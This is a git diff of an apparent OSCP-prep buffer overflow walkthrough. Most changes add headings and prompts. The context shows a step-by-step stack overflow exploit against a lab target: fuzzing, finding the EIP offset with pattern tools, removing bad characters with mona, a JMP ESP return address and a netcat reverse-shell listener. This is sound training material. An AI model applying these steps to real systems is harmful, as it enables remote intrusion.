@@ -44,7 +44,7 @@ Finding a jump point
 ```
 
 
-# Fuzz the target:
+# Fuzz the target
 
 Fuzz testing is the process of finding security vulnerabilities in input-parsing code. We will fuzz remote entry points to an application as this will send increasingly long buffer strings.. Our main goal is to crash the application and see if it vulnerable to buffer overflow
 
@@ -118,7 +118,7 @@ if __name__ == '__main__':
         fuzzer(host, port)
 ```
 
-Run the fuzzer..
+Run the fuzzer
 ```
 $ ./fuzzer.py 
 fuzzing at 100 bytes..
@@ -143,8 +143,10 @@ KeyboardInterrupt
 
 After fuzzing and the application crashed, we can use a pattern on our kali linux.
 
+# Creating a pattern
+
 ```shell
-`locate pattern_create.rb` -l 1000
+$ `locate pattern_create.rb` -l 1000
 ```
 Modify the script and pass the pattern to the vulnerable application instead of the A's
 
@@ -184,6 +186,8 @@ if __name__ == '__main__':
         exploit()
 ```
 
+# Getting the Offset
+
 After executing the script, the application should crash and get the EIP. This will be used to get our offset.
 
 ![get_eip.png](https://github.com/catx0rr/bufferoverflow/blob/master/oscpoverflow-prep/overflow5/img/get_eip.png)
@@ -192,7 +196,7 @@ locate the offset by using mona or mestasploit's pattern_offset.rb.
 
 Pattern Offset
 ```shell
-`locate pattern_offset.rb` -l 1000 -q 356B4134
+$ `locate pattern_offset.rb` -l 1000 -q 356B4134
 
 [*] Exact match at offset 314
 ```
@@ -204,6 +208,8 @@ Mona
 ![mona_offset.png](https://github.com/catx0rr/bufferoverflow/blob/master/oscpoverflow-prep/overflow5/img/mona_offset.png)
 
 After getting the offset, pass 4 bytes of "B" character to know that we overwritten the instruction pointer (EIP) with 42424242. Modify the script again as follows.
+
+# Controlling EIP
 
 *exploit.py*
 ```python
@@ -245,6 +251,8 @@ After executing the script.. 4 bytes of B's.. we control the EIP.
 ![eip_overwritten_42.png](https://github.com/catx0rr/bufferoverflow/blob/master/oscpoverflow-prep/overflow5/img/eip_overwritten_42.png)
 
 Since the EIP is now on our control, we can remove the bad chars to ensure that the shellcode will not be terminated. Any badchars including null byte will terminate our malicous code. Generate badchars, exclude the nullbyte "\x00" and include it on the script.
+
+# Removing Badchars
 
 Python shell
 ```shell
@@ -294,7 +302,7 @@ if __name__ == '__main__':
         exploit()
 ```
 Before exploiting, remove the nullbyte and generate it on mona so we can compare later.
-```shell
+```
 !mona bytearray -b "\x00"
 ```
 
@@ -304,7 +312,7 @@ Execute the script. After executing, follow the hexdump of stack pointer (ESP).
 
 There a couple of badcharacters.. a string terminator. If our exploit code falls off on badchars like this, it will be terminated. Goal is to remove the badcharacters. We can easly spot them using mona.
 
-```shell
+```
 !mona compare -f c:\users\admin\desktop\oscp\bytearray.bin -a 0198FA30
 ```
 
@@ -313,6 +321,7 @@ There a couple of badcharacters.. a string terminator. If our exploit code falls
 We got all of the badchars. Remove them now on our shellcode. And compare again.
 You may remove it one by one to ensure that the correct badchars are omitted.
 
+*exploit.py*
 ```python
 #!/usr/bin/python3
 
@@ -377,6 +386,7 @@ Click the View -> Log, if it doesnt show. We can see the ESP return addresses. W
 
 Modify the the script again and put the jmp esp. Note that x86 is little endian so address must be put in backwards. (625011af -> \xaf\x11\x50\x62) replace the 4 bytes we put on the EIP, and put the return address, to redirect it to our shellcode.
 
+*exploit.py*
 ```python3
 #!/usr/bin/python3
 
@@ -434,6 +444,8 @@ listening on [any] 443 ...
 ```
 
 Sum up our exploit before we execute:
+
+*exploit.py*
 ```python3
 #!/usr/bin/python3                                                                                                                                                      [26/1723]
                                             
